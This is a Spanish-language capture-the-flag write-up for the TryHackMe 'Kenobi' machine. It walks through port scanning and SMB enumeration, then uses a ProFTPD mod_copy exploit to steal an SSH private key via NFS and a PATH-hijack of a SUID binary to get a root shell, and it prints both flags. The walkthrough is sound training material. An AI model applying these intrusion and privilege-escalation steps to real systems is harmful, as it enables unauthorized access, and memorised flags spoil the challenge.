# Writeup Kenobi - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.113.150.244` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---


## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Iniciamos la fase de reconocimiento con un escaneo inicial de puertos para identificar los servicios expuestos:

```bash
sudo nmap -sC -sV -sS -Pn 10.113.150.244 -oN scan_kenobi.txt
```
```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41
111/tcp  open  rpcbind     2-4
139/tcp  open  netbios-ssn Samba
445/tcp  open  netbios-ssn Samba
2049/tcp open  nfs         3-4
```

### Resultados del Escaneo

Ya tenemos los resultados. Se identifican 7 puertos abiertos, y el que más llama la atención es el puerto 445 (Samba), ya que es probable que hayan dejado algo (información confidencial, contraseñas...) en archivos compartidos accesibles de forma anónima.

---

## Enumeración

Ahora vamos a enumerar los shares del SMB con "smbmap" para saber qué acceso tenemos en cada uno.

![smbmap](/imgKenobi/image.png)

Se descubren 3 shares diferentes, siendo el más interesante el llamado "anonymous" al que podemos acceder con permisos de lectura, lo que probablemente contenga información jugosa. 

---

## Explotación

Al acceder con "smbclient", encontramos un archivo log.txt que descargamos y revisamos. Es un log del usuario "kenobi" de la configuración del servidor FTP sin demasiada importancia en sí mismo, pero lo más interesante es que contiene la referencia a la llave RSA privada para acceder por SSH, así que anotamos esto para después. Mientras tanto, giramos la atención hacia el puerto FTP.

Al revisar la versión de FTP, es la 1.3.5, y con la herramienta de searchsploit, podemos buscar exploits de dicha versión para ganar acceso al sistema.

![searchsploit](/imgKenobi/image3.png)

Genial, se descubren 4 exploits diferentes para esta versión de ProFTPD. Pero antes de meterse en líos, vamos a usar el exploit mod_copy para copiar la llave privada SSH del usuario kenobi, así podemos acceder directamente como él a la máquina.

![exploit](/imgKenobi/image2.png)

Una vez que la clave ha sido copiada al directorio `/var/tmp/`, procedemos a montar el recurso compartido NFS para transferirla a nuestro equipo local:

```bash
# Creamos un punto de montaje y montamos el recurso
sudo mkdir /mnt/kenobiNFS
sudo mount -t nfs [IP_ADDRESS]:/var/tmp /mnt/kenobiNFS
```

Con el recurso montado, podemos recuperar la clave `id_rsa` y utilizarla para el acceso SSH:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
```

```bash
ssh -i id_rsa kenobi@10.113.150.244
```
```text
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

---

## Escalada de Privilegios

Ahora que estamos dentro como kenobi, hay que buscar la forma de escalar a root. Utilizamos `find / -perm -u=s -type f 2>/dev/null` para listar los binarios con permisos setuid anómalos, y casualidad del destino, nos encontramos con `/usr/bin/menu`, un binario raro que no debería estar ahí. Al ejecutarlo, vemos un menú con 3 opciones de sistema, pero lo importante es que el binario corre con permisos de root, lo que significa que podemos manipularlo para ganar acceso de root y conseguir la deseada flag.

![menu](/imgKenobi/image5.png)

```bash
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
```

![menu2](/imgKenobi/image6.png)

¡Bum! Tenemos acceso root a la máquina, y además podemos coger la deseada flag de root.

---

## Conclusión y Lecciones Aprendidas

Hemos aprendido que la enumeración exhaustiva es fundamental: desde descubrir servicios desactualizados (ProFTPD 1.3.5 con mod_copy vulnerable), hasta aprovechar malas configuraciones de permisos en binarios SUID. La combinación de explotar vulnerabilidades conocidas y manipular binarios con permisos de root nos permite comprometer completamente el sistema sin necesidad de vulnerabilidades complejas o scripts sospechosos.

---

## Flags

- **User Flag**: d0b0f3f53b6caa532a83915e19224899
- **Root Flag**: 177b3cd8562289f37382721c28381f02
